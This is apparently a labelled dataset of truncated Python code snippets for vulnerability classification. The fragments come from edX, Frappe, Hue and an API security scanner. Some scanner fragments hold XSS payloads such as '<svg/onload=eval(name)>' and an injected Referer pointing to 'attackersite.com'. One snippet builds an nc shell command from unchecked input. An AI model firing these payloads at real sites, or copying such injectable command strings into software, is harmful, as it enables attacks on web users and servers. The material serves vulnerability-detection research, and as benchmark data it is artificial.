\"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,", "label": 0}, {"snippet_id": 41470, "code": "\t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image", "label": 0}, {"snippet_id": 49035, "code": " def fields(self): return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param", "label": 0}, {"snippet_id": 33449, "code": " url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x", "label": 1}, {"snippet_id": 19642, "code": "=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar", "label": 0}, {"snippet_id": 2266, "code": ": %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url", "label": 0}, {"snippet_id": 2525, "code": "\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post", "label": 1}, {"snippet_id": 36728, "code": "\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context", "label": 0}, {"snippet_id": 48100, "code": ") width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped=original.resize((int(width)", "label": 0}, {"snippet_id": 16742, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*", "label": 1}, {"snippet_id": 36176, "code": "\"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value", "label": 0}, {"snippet_id": 11118, "code": "\"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers", "label": 0}, {"snippet_id": 14679, "code": ".py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 16428, "code": ".simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if", "label": 0}, {"snippet_id": 42897, "code": "\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t", "label": 0}, {"snippet_id": 35285, "code": " in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self", "label": 0}, {"snippet_id": 43329, "code": " \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code", "label": 0}, {"snippet_id": 13973, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 1260, "code": ": msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id')", "label": 0}, {"snippet_id": 37618, "code": ": \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif", "label": 0}, {"snippet_id": 9541, "code": "/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications',", "label": 0}, {"snippet_id": 35798, "code": " truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self", "label": 0}, {"snippet_id": 38907, "code": "\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype", "label": 0}, {"snippet_id": 1750, "code": ", methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults", "label": 0}, {"snippet_id": 50519, "code": " render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to be done,", "label": 0}, {"snippet_id": 13955, "code": "/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 28240, "code": ") \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master", "label": 0}, {"snippet_id": 43761, "code": "(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: ", "label": 0}, {"snippet_id": 8118, "code": "+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history", "label": 0}, {"snippet_id": 35839, "code": "(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value", "label": 0}, {"snippet_id": 4463, "code": "'\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i)", "label": 0}, {"snippet_id": 45875, "code": ".update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException", "label": 0}, {"snippet_id": 33693, "code": ".comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\"", "label": 0}, {"snippet_id": 46274, "code": " return no_collections(request) collection=Collection2(user=request.user, name=name, engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m", "label": 0}, {"snippet_id": 15830, "code": ", **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root", "label": 0}, {"snippet_id": 22700, "code": "'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 2417, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1", "label": 0}, {"snippet_id": 49590, "code": "=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self", "label": 0}, {"snippet_id": 13927, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$'", "label": 0}, {"snippet_id": 30302, "code": "=\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port", "label": 0}, {"snippet_id": 22999, "code": ", 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses", "label": 0}, {"snippet_id": 51320, "code": "): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model", "label": 0}, {"snippet_id": 46469, "code": "!') else: response['message']=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET", "label": 0}, {"snippet_id": 15507, "code": " combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting", "label": 0}, {"snippet_id": 12596, "code": "+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 45168, "code": "('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator", "label": 0}, {"snippet_id": 38631, "code": "): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) ", "label": 0}, {"snippet_id": 528, "code": " api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line:", "label": 0}, {"snippet_id": 1164, "code": " from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder", "label": 1}, {"snippet_id": 12418, "code": " 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 53211, "code": " job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name", "label": 0}, {"snippet_id": 15064, "code": ") return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self)", "label": 0}, {"snippet_id": 46640, "code": "=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs): form=self.get_form", "label": 0}, {"snippet_id": 49951, "code": " the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import", "label": 0}, {"snippet_id": 41363, "code": "=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"", "label": 0}, {"snippet_id": 3928, "code": " xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET", "label": 1}, {"snippet_id": 16125, "code": ".views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views", "label": 0}, {"snippet_id": 37046, "code": ": \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category", "label": 0}, {"snippet_id": 38895, "code": ": \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not", "label": 0}, {"snippet_id": 27294, "code": " s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str(e) print", "label": 1}, {"snippet_id": 43692, "code": "(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"", "label": 0}, {"snippet_id": 34368, "code": "\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault", "label": 0}, {"snippet_id": 15640, "code": ".imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) )", "label": 0}, {"snippet_id": 6503, "code": " particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"", "label": 0}, {"snippet_id": 14744, "code": " name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name=", "label": 0}, {"snippet_id": 50581, "code": ") elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession", "label": 0}, {"snippet_id": 1319, "code": "\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data", "label": 0}, {"snippet_id": 27710, "code": "._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status", "label": 0}, {"snippet_id": 27478, "code": ", encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)", "label": 0}, {"snippet_id": 44665, "code": " if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps", "label": 0}, {"snippet_id": 27126, "code": " page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[", "label": 1}, {"snippet_id": 1430, "code": "/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route", "label": 0}, {"snippet_id": 25725, "code": ".answer if initial else None, min_value=Decimal('0.00'), ) elif q.type==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if", "label": 0}, {"snippet_id": 23317, "code": "'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P", "label": 0}, {"snippet_id": 41398, "code": " or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on", "label": 0}, {"snippet_id": 11272, "code": ".__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path", "label": 0}, {"snippet_id": 30234, "code": ".get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form", "label": 0}, {"snippet_id": 4154, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0", "label": 0}, {"snippet_id": 8128, "code": ">[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url", "label": 0}, {"snippet_id": 17736, "code": "'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 21672, "code": "]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt", "label": 0}, {"snippet_id": 625, "code": "=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(", "label": 1}, {"snippet_id": 15450, "code": " been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value", "label": 0}, {"snippet_id": 49094, "code": ".index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id", "label": 0}, {"snippet_id": 50554, "code": " to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif", "label": 0}, {"snippet_id": 24058, "code": " values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format(", "label": 0}, {"snippet_id": 31611, "code": "\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv", "label": 0}, {"snippet_id": 9372, "code": "/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 30142, "code": "' '{print $1}'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv)", "label": 0}, {"snippet_id": 39804, "code": "] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle", "label": 0}, {"snippet_id": 29204, "code": ".get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line", "label": 0}, {"snippet_id": 38791, "code": " and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self", "label": 0}, {"snippet_id": 52357, "code": "['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner", "label": 0}, {"snippet_id": 867, "code": " if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']:", "label": 1}, {"snippet_id": 5520, "code": "\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src", "label": 0}, {"snippet_id": 49423, "code": " __init__(self, model, field, query_params, object_list): self.model=model if isinstance(field, SmartListFilter): self.field_name=field.parameter_name self.model_field=field else: self.field_name=field", "label": 0}, {"snippet_id": 35783, "code": ".doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference,", "label": 0}, {"snippet_id": 12949, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if", "label": 0}, {"snippet_id": 39799, "code": "'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 33676, "code": ")==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc", "label": 0}, {"snippet_id": 28905, "code": " str(error) def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv)", "label": 0}, {"snippet_id": 18546, "code": ")/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 21028, "code": "'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 4061, "code": "\"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True", "label": 0}, {"snippet_id": 41041, "code": ",)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname", "label": 0}, {"snippet_id": 47640, "code": "(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br /", "label": 0}, {"snippet_id": 52301, "code": " workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else", "label": 0}, {"snippet_id": 21773, "code": "/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab", "label": 0}, {"snippet_id": 10808, "code": ".har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs", "label": 0}, {"snippet_id": 50112, "code": ") if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid", "label": 0}, {"snippet_id": 4281, "code": ",method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid)", "label": 0}, {"snippet_id": 23839, "code": "}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store=", "label": 0}, {"snippet_id": 53667, "code": " i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission", "label": 0}, {"snippet_id": 21848, "code": "', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),", "label": 0}, {"snippet_id": 7064, "code": ".create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration',", "label": 0}, {"snippet_id": 6109, "code": "\"\"\" Class holding IdP application configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError", "label": 0}, {"snippet_id": 44196, "code": " import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document", "label": 0}, {"snippet_id": 9498, "code": "(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort", "label": 0}, {"snippet_id": 39362, "code": "=1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name", "label": 0}, {"snippet_id": 31944, "code": "+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t ", "label": 0}, {"snippet_id": 3487, "code": " xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse", "label": 0}, {"snippet_id": 10712, "code": " or equal to the number of available processors. verify_xss 